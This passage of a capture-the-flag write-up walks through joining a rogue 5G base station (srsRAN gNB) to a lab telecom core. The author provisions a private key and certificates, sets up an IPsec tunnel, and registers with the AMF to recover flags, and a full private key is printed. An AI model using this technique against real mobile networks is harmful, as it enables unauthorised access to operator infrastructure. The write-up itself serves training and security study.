It is required to provision our private key.

```shell
root@gNB-MyVendor:/etc/swanctl# echo "-----BEGIN EC PRIVATE KEY-----
MIGkAgEBBDBat3vpyOenG9hKSDQ6yMAXo6ZI3n8ZIIPUc3YeH1/hhWet3xVUlL8v
pgLtSG+TVJygBwYFK4EEACKhZANiAARVbMRdndtDtklZjbkJUh2bpIOKf21K/kc+
937VnUWJCtFKrRZuh5hdI5hYZJJVJn5r+Z0pfxDsJtzZ9pbPLzJw+w5GPfbLvpTz
4iVRVwkY+xBEXS3ZHHAiefbxVaVO0qQ=
-----END EC PRIVATE KEY-----
" > ./private/gnb.key
```

Then to provision our certficate got from the CMPv2 server.

```shell
root@gNB-MyVendor:/etc/swanctl# echo "-----BEGIN CERTIFICATE-----
MIIEiTCCAnGgAwIBAgIUOVmnktHrmnIIaUau7e5J9q+lCYowDQYJKoZIhvcNAQEL
BQAwQzELMAkGA1UEBhMCRlIxFjAUBgNVBAoMDVB3bmVkIFRlbGVjb20xHDAaBgNV
..
D6S7YD6AZCoqtmUhb6NwCIj93Z0ybOqswxLOqh24Wk9v7WKkZWhqBTEC1TEx0/QC
lFs6Py4DH8ZVcbxYVrWG7Sk2QmmR0Rg8yHCFBz770wm+IpQiQkI+llmq1dbevsoS
klIc3cBvICdkBubRWkq74
-----END CERTIFICATE-----" > ./x509/gnb.pem
```

And then to push the certificate chain given at the begining of the challenge.

```shell
root@gNB-MyVendor:/etc/swanctl# echo "-----BEGIN CERTIFICATE-----
MIIFeTCCA2GgAwIBAgIUHU/aQRouGgF93358WlM/R/6ofT8wDQYJKoZIhvcNAQEL
..
Ad5j7ppA9GXH2dDdxAuarDeiPTeojuEYgn1b2QE+ILgQuAYq7ADWHiOwustVaDvf
yT50PQOHl6qPw==iW/qGv5hfp5Po9Mb6TXbzAT3
-----END CERTIFICATE-----" > ./x509ca/CA.pem
```

The IPSec configuration file needs to be slightly modified.

```shell
root@gNB-MyVendor:/etc/swanctl# cat swanctl.conf
# secgw.pwned-telecom.com = 10.194.124.35

connections {
    pwned_connection {
        remote_addrs = secgw.pwned-telecom.com
        vips = 0.0.0.0
        local {
            auth = pubkey
            certs = gnb.pem
            id = "C = FR, O = MyGNB Vendor, CN = GNB0002164987.mygnb-vendor.org"
        }
        remote {
            auth = pubkey
            id = "C = FR, O = Pwned Telecom, CN = secgw.pwned-telecom.com"
        }
        children {
        pwned_connection {
            remote_ts  = 10.1.0.5/32
            start_action = start
        }
        }
    }
}
```

The file can be modified to point to the IPSec gateway IP address or the file */etc/hosts* can be updated.

```shell
root@gNB-MyVendor:/etc/swanctl# echo "10.194.124.35   secgw.pwned-telecom.com" >> /etc/hosts
```

Strongswan has to be restarted with the new configuration after having activated the network interface, see below.

```shell
root@gNB-MyVendor:/etc/swanctl# ip link
root@gNB-MyVendor:/etc/swanctl# ip link set ens3 up
root@gNB-MyVendor:/etc/swanctl# dhclient -i ens3
root@gNB-MyVendor:/etc/swanctl# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 52:54:00:00:00:01 brd ff:ff:ff:ff:ff:ff
    altname enp0s3
    inet 10.194.128.141/25 brd 10.194.128.255 scope global dynamic ens3
       valid_lft 86271sec preferred_lft 86271sec
    inet6 fe80::5054:ff:fe00:1/64 scope link 
       valid_lft forever preferred_lft forever
root@gNB-MyVendor:/etc/swanctl#
root@gNB-MyVendor:/etc/swanctl# systemctl restart ipsec
root@gNB-MyVendor:/etc/swanctl# swanctl --load-all
root@gNB-MyVendor:/etc/swanctl# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 52:54:00:00:00:01 brd ff:ff:ff:ff:ff:ff
    altname enp0s3
    inet 10.194.128.141/25 brd 10.194.128.255 scope global dynamic ens3
       valid_lft 86271sec preferred_lft 86271sec
    inet 10.3.0.1/32 scope global ens3
       valid_lft forever preferred_lft forever
    inet6 fe80::5054:ff:fe00:1/64 scope link 
       valid_lft forever preferred_lft forever
root@gNB-MyVendor:/etc/swanctl#
```

A new IP address is provided as a VIP.  
THIRD FLAG: hit{10.3.0.1}

So we have now a connection toward the Telco infrastructure. We have to register our fake gNB.

srsRAN seems to be installed on the image. We have the binary and a partial configuration file. We have to setup the binding IP address: 10.3.0.1.

```shell
root@gNB-MyVendor:/etc/swanctl# cat /etc/gnb_config.yml 
# GNB configuration file
# Flag (Replace '!' by 'i' ;o): h!t{S0-intere$ting-config-f!le}

#cmpv2:
  # url: http://<CMPV2_IP>/ejbca/publicweb/cmp/3GPP
  # url: http://10.194.124.35/ejbca/publicweb/cmp/3GPP

cu_cp:
  amf:
    addr: 10.1.0.5
    port: 38412
    bind_addr: 10.3.0.1
    supported_tracking_areas:
      - tac: 1
        plmn_list:
          - plmn: "00101"
            tai_slice_support_list:
              - sst: 1
                sd: 1

ru_sdr:
  device_driver: uhd
  device_args: type=n3xx
  clock: gpsdo
  sync: gpsdo
  srate: 30.72
  tx_gain: 35
  rx_gain: 60

cell_cfg:
  dl_arfcn: 368640
  band: 3
  channel_bandwidth_MHz: 20
  common_scs: 15
  plmn: "00101"
  tac: 7
  pci: 1

log:
  filename: /tmp/gnb.log
  all_level: info

pcap:
  mac_enable: false
  mac_filename: /tmp/gnb_mac.pcap
  ngap_enable: false
  ngap_filename: /tmp/gnb_ngap.pcap
root@gNB-MyVendor:/etc/swanctl#
```

Then we launch our fake gNB.

```shell
root@gNB-MyVendor:/etc/swanctl# /usr/bin/gnb -c /etc/gnb_config.yml 

--== srsRAN gNB (commit d8bfdc9d9c) ==--

Lower PHY in quad executor mode.
Available radio types: uhd.
[INFO] [UHD] linux; GNU C++ version 12.2.0; Boost_107400; UHD_4.3.0.0+ds1-5
[INFO] [LOGGING] Fastpath logging disabled at runtime.
Making USRP object with args 'type=n3xx,master_clock_rate=122.88e6,send_frame_size=8000,recv_frame_size=8000'
Failed to open device with address 'type=n3xx': LookupError: KeyError: No devices found for ----->
Device Address:
    type: n3xx
    master_clock_rate: 122.88e6
    send_frame_size: 8000
    recv_frame_size: 8000

srsRAN ERROR: Unable to create radio session.
root@gNB-MyVendor:/etc/swanctl#
```

Our qemu does not emulate radio hardware, we need to start with dummy radio options in order to avoid UHD issue. Additionally, we need to get more debug about NGAP protocol by applying the relevant configuration key word.

```shell
root@gNB-MyVendor:/etc# cat /etc/gnb_config.yml 
# GNB configuration file
# Flag (Replace '!' by 'i' ;o): h!t{S0-intere$ting-config-f!le}

#cmpv2:
  # url: http://<CMPV2_IP>/ejbca/publicweb/cmp/3GPP
  # url: http://10.194.124.35/ejbca/publicweb/cmp/3GPP

cu_cp:
  amf:
    addr: 10.1.0.5
    port: 38412
    bind_addr: 10.3.0.1
    supported_tracking_areas:
      - tac: 1
        plmn_list:
          - plmn: "00101"
            tai_slice_support_list:
              - sst: 1
                sd: 1

ru_dummy:
  dl_processing_delay: 1
  time_scaling: 1

cell_cfg:
  dl_arfcn: 368640
  band: 3
  channel_bandwidth_MHz: 20
  common_scs: 15
  plmn: "00101"
  tac: 1
  pci: 1

log:
  filename: /tmp/gnb.log
  all_level: info
  ngap_level: debug

pcap:
  mac_enable: false
  mac_filename: /tmp/gnb_mac.pcap
  ngap_enable: false
  ngap_filename: /tmp/gnb_ngap.pcap
root@gNB-MyVendor:/etc#
```

Then we can start the gNB and catch the log.

```shell
root@gNB-MyVendor:/etc# /usr/bin/gnb -c /etc/gnb.yml 

--== srsRAN gNB (commit d8bfdc9d9c) ==--

Cell pci=1, bw=20 MHz, 1T1R, dl_arfcn=368640 (n3), dl_freq=1843.2 MHz, dl_ssb_arfcn=367230, ul_freq=1748.2 MHz

N2: Connection to AMF on 10.1.0.5:38412 completed
==== gNB started ===
Type <h> to view help
```

The gNB binary generates logs and traces on /tmp.

```shell
root@gNB-MyVendor:~# cat /tmp/gnb.log
...
2025-07-21T15:57:08.003503 [GNB     ] [I] Starting CU-CP...
2025-07-21T15:57:08.044170 [SCTP-GW ] [I] N2: Bind to 10.3.0.1:0 was successful
2025-07-21T15:57:08.046191 [IO-EPOLL] [I] fd=8: Registered file descriptor successfully
2025-07-21T15:57:08.046194 [SCTP-GW ] [I] N2: SCTP connection to AMF on 10.1.0.5:38412 was established
2025-07-21T15:57:08.046200 [CU-CP   ] [I] N2: Connection to AMF on 10.1.0.5:38412 was established
2025-07-21T15:57:08.054133 [NGAP    ] [D] "NG Setup Procedure" started...
2025-07-21T15:57:08.054136 [NGAP    ] [I] Tx PDU: NGSetupRequest
{
  "initiatingMessage": {
    "procedureCode": 21,
    "criticality": "reject",
    "value": {
      "NGSetupRequest": {
        "protocolIEs": {
          "id": 27,
          "criticality": "reject",
          {
            "globalGNB-ID": {
              "pLMNIdentity": "00f110",
              "gNB-ID": {
                "gNB-ID": "0000000000000110011011"
              }
            }
          },
          "id": 82,
          "criticality": "ignore",
          "Value": "srscucp01",
          "id": 102,
          "criticality": "reject",
          "Value": [
            {
              "tAC": "000001",
              "broadcastPLMNList": [
                {
                  "pLMNIdentity": "00f110",
                  "tAISliceSupportList": [
                    {
                      "s-NSSAI": {
                        "sST": "01",
                        "sD": "000001"
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "id": 21,
          "criticality": "ignore",
          "Value": "v256"
        }
      }
    }
  }
}
2025-07-21T15:57:08.060309 [NGAP    ] [I] Rx PDU: NGSetupResponse
{
  "successfulOutcome": {
    "procedureCode": 21,
    "criticality": "reject",
    "value": {
      "NGSetupResponse": {
        "protocolIEs": {
          "id": 1,
          "criticality": "reject",
          "Value": "FlagFr0mPycrateAmfToPut1ntoBrack3ts",
          "id": 96,
          "criticality": "reject",
          "Value": [
            {
              "gUAMI": {
                "pLMNIdentity": "00f110",
                "aMFRegionID": "00000001",
                "aMFSetID": "0000000001",
                "aMFPointer": "000000"
              }
            }
          ],
          "id": 86,
          "criticality": "ignore",
          "Value": 10,
          "id": 80,
          "criticality": "reject",
          "Value": [
            {
              "pLMNIdentity": "00f110",
              "sliceSupportList": [
                {
                  "s-NSSAI": {
                    "sST": "00"
                  }
                }
              ]
            }
          ]
        }
      }
    }
  }
}
2025-07-21T15:57:08.060313 [NGAP    ] [D] "NG Setup Procedure" finished successfully
2025-07-21T15:57:08.063277 [CU-CP   ] [I] Connected to AMF. Supported PLMNs: 00101
2025-07-21T15:57:08.063296 [GNB     ] [I] CU-CP started successfully
...
```

The AMF name is received in the NGSetupResponse.

**FOURTH FLAG**: hit{FlagFr0mPycrateAmfToPut1ntoBrack3ts}

You can shutdown your gNB, you have reached the final stage :o)

```shell
root@gNB-MyVendor:~# systemctl poweroff
```
